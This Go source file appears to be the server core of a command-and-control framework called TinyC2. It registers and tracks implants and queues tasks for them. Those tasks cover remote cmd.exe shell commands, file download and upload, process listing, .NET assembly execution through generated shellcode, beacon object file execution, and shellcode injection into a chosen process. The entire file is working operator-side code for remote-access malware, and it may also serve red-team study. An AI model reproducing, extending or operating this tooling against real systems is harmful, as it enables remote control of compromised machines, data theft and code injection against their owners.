// Package core
package core

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/pack"

	"github.com/pterm/pterm"
)

type Implant struct {
	ID       uint32
	Seen     time.Time
	Channel  string
	Tasks    []map[string]any
	Channels map[string]uint32
}

type TaskResult struct {
	Name     string `json:"name"`
	Output   string `json:"output"`
	Artifact string `json:"artifact"`
	Status   string `json:"status"`
}

type ImplantResponse struct {
	ID    uint32       `json:"id"`
	Tasks []TaskResult `json:"tasks"`
}

func (e *Engine) ImplantProcess(listener string, data []byte) ([]byte, error) {
	var response ImplantResponse

	err := json.Unmarshal(data, &response)
	if err != nil {
		logger.Error("error parsing JSON: %v", err)
		return nil, err
	}

	if !e.ImplantExists(response.ID) {
		return e.ImplantRegister(response.ID, listener)
	} else {
		// update implant last seen
		implant := e.Implants[response.ID]
		implant.Seen = time.Now()
		e.Implants[response.ID] = implant

		// task result processing
		e.ImplantTaskResultDispatch(response.ID, response.Tasks)

		// return task requests
		return e.ImplantGetTaskRequests(response.ID), nil
	}
}

func (e *Engine) ImplantRegister(id uint32, listener string) ([]byte, error) {
	if e.ImplantExists(id) {
		return []byte{}, fmt.Errorf("implant already exists")
	}

	e.Implants[id] = Implant{
		ID:      id,
		Channel: listener,
		Channels: map[string]uint32{
			listener: 0,
		},
	}

	data, err := json.Marshal(map[string]any{"magic": "baadf00d"})
	if err != nil {
		logger.Error("error marshaling JSON: %v", err)
		return []byte{}, err
	}

	fmt.Println()
	logger.Success("implant %X registred", id)

	return data, nil
}

func (e *Engine) ImplantTaskExecute(id uint32, task map[string]any) {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %s does not exists", pterm.Cyan(id))
		return
	}

	implant.Tasks = append(implant.Tasks, task)
	e.Implants[id] = implant
}

func (e *Engine) ImplantGetTaskRequests(id uint32) []byte {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return []byte{}
	}

	tasks := implant.Tasks
	implant.Tasks = []map[string]any{}
	e.Implants[id] = implant

	data, err := json.Marshal(tasks)
	if err != nil {
		logger.Error("error marshaling JSON: %v", err)
		return []byte{}
	}

	if len(tasks) > 0 {
		fmt.Println()
		logger.Info("sent %d bytes to implant %X", len(data), id)
	}

	return data
}

func (e *Engine) ImplantExists(id uint32) bool {
	_, exists := e.Implants[id]
	if !exists {
		return false
	}
	return true
}

func (e *Engine) ImplantIsAlive(id uint32) bool {
	implant, exists := e.Implants[id]
	if !exists {
		return false
	}

	return time.Since(implant.Seen) <= 5*time.Second
}

func (e *Engine) ImplantKill(id uint32) error {
	if !e.ImplantExists(id) {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	// execute exit command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "exit",
		"args":     nil,
		"artifact": nil,
	})
	return nil
}

func (e *Engine) ImplantList() error {
	table := pterm.TableData{
		{"ID", "Listener", "Status"},
	}

	for id, implant := range e.Implants {
		if e.ImplantIsAlive(id) {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.Channel, pterm.Green("alive")})
		} else {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.Channel, pterm.Red("dead")})
		}
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ImplantChannelList(id uint32) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	table := pterm.TableData{
		{"ID", "Name"},
	}

	for name, id := range implant.Channels {
		if implant.Channel == name {
			table = append(table, []string{pterm.Green(fmt.Sprintf("* %X", id)), pterm.Green(name)})
		} else {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), name})
		}
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ImplantChannelRegister(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return nil
	}

	// generate pic
	listener, exists := e.Listeners[name]
	if !exists {
		logger.Error("listener %s does not exists", name)
		return nil
	}

	if listener.ID == 0 {
		logger.Error("%s is a default channel", name)
		return nil
	}

	pic, args, err := listener.Interface.MakePic(listener.ID)
	if err != nil {
		logger.Error("MakePic error: %v", err)
		return nil
	}

	implant.Channels[name] = listener.ID
	e.Implants[id] = implant

	// execute channel.register command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.register",
		"args":     []string{base64.StdEncoding.EncodeToString(args)},
		"artifact": base64.StdEncoding.EncodeToString(pic),
	})

	return nil
}

func (e *Engine) ImplantChannelSwitch(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	if implant.Channel == name {
		logger.Error("channel %s is currently used", name)
		return nil
	}

	channel, exists := implant.Channels[name]
	if !exists {
		logger.Error("channel %s not registered", name)
		return nil
	}

	implant.Channel = name
	e.Implants[id] = implant

	// execute channel.swtich command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.switch",
		"args":     []uint32{channel},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantChannelRemove(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	channel, exists := implant.Channels[name]
	if !exists {
		logger.Error("channel %s not registered", name)
		return nil
	}

	if name == implant.Channel {
		logger.Error("channel %s is currently used", name)
		return nil
	}

	if channel == 0 {
		logger.Error("%s channel is a default channel", name)
		return nil
	}

	delete(implant.Channels, name)
	e.Implants[id] = implant

	// execute channel.remove command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.remove",
		"args":     []uint32{channel},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantJobStop(id uint32, jobid uint32) error {
	// execute job.stop command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "job.stop",
		"args":     []uint32{jobid},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantJobList(id uint32) error {
	// execute job.stop command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "job.list",
		"args":     nil,
		"artifact": nil,
	})

	return nil
}

// ImplantPs
func (e *Engine) ImplantPs(id uint32) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "ps",
		"args":     nil,
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantCd(id uint32, directory string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "cd",
		"args":     []string{directory},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantCp(id uint32, src string, dest string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "cp",
		"args":     []string{src, dest},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantShell(id uint32, command string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "shell",
		"args":     []string{"C:\\Windows\\System32\\cmd.exe /c " + command},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantDownload(id uint32, path string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "download",
		"args":     []string{path},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantUpload(id uint32, src string, dest string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		logger.Error("failed to read file: %v", err)
		return err
	}

	e.ImplantTaskExecute(id, map[string]any{
		"name":     "upload",
		"args":     []string{dest},
		"artifact": base64.StdEncoding.EncodeToString(data),
	})

	return nil
}

func (e *Engine) ImplantRun(id uint32, commandline string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "run",
		"args":     []string{commandline},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantExecuteAssembly(id uint32, dotnet string, cmdargs string) error {
	args := []string{
		"-Dcrystalpalace.verbose=false",
		"-jar",
		e.Config.CrystalPalace.Lib,
		"buildPic",
		filepath.Join(e.Config.CrystalPalace.Pavilion, "execute-assembly-pico/runner.spec"),
		"x64",
		"/tmp/runner.bin",
		`%ASSEMBLY_PATH=` + dotnet,
		`%CMDLINE=` + cmdargs,
	}

	cmd := exec.Command("java", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		logger.Error("configuration failed: %v", err)
		return nil
	}

	// read shellcode
	pic, err := os.ReadFile("/tmp/runner.bin")
	if err != nil {
		logger.Error("failed to read implant exe: %v", err)
		return nil
	}

	e.ImplantTaskExecute(id, map[string]any{
		"name":     "execute-assembly",
		"args":     nil,
		"artifact": base64.StdEncoding.EncodeToString(pic),
	})

	return nil
}

func (e *Engine) ImplantInlineExecute(id uint32, bof string, bofargs []byte) {
	// read bof
	bofraw, err := os.ReadFile(bof)
	if err != nil {
		logger.Error("failed to read beacon object file: %v", err)
		return
	}

	// execute task
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "inline-execute",
		"args":     []string{base64.StdEncoding.EncodeToString(bofargs)},
		"artifact": base64.StdEncoding.EncodeToString(bofraw),
	})
}

func (e *Engine) ImplantInlineExecuteEx(id uint32, bof string, packorder string, args []string) {
	// read bof
	bofraw, err := os.ReadFile(bof)
	if err != nil {
		logger.Error("failed to read beacon object file: %v", err)
		return
	}

	// pack arguments
	bofargs, err := pack.BofPack(packorder, args)
	if err != nil {
		logger.Error("failed to pack beacon object file arguments: %v", err)
		return
	}

	// execute task
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "inline-execute",
		"args":     []string{base64.StdEncoding.EncodeToString(bofargs)},
		"artifact": base64.StdEncoding.EncodeToString(bofraw),
	})
}

func (e *Engine) ImplantInjectShellcode(id uint32, pid int, path string) {
	payload, err := os.ReadFile(path)
	if err != nil {
		logger.Error("failed to read beacon object file: %v", err)
		return
	}

	// execute task
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "inject-shellcode",
		"args":     []int{pid},
		"artifact": base64.StdEncoding.EncodeToString(payload),
	})
}
